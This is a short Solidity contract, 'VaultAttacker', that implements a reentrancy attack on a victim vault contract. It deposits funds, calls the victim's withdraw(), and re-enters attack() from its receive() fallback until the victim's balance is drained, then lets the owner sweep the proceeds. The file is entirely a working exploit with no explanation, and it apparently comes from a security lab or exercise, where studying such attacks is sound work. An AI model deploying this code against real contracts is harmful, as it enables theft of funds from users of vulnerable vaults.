//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract VaultAttacker {

    using Address for address payable;

    address public victim;
    address payable private owner;
    uint256 private amount;

    constructor(address _victim, uint256 _amount) {
        victim = _victim;
        owner = payable(msg.sender);
        amount = _amount;
    }

    function deposit() external payable{
        require(msg.value == amount);
        (bool success,) = victim.call{value: amount}("");
        require(success, "DEPOSIT_FAILED");
    }

    function attack() public {
        (bool success,) = victim.call(abi.encodeWithSignature("withdraw()"));
        require(success);
    }

    receive() external payable {
        if (victim.balance  >= amount) {
            attack();
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.sendValue(address(this).balance);
    }

}
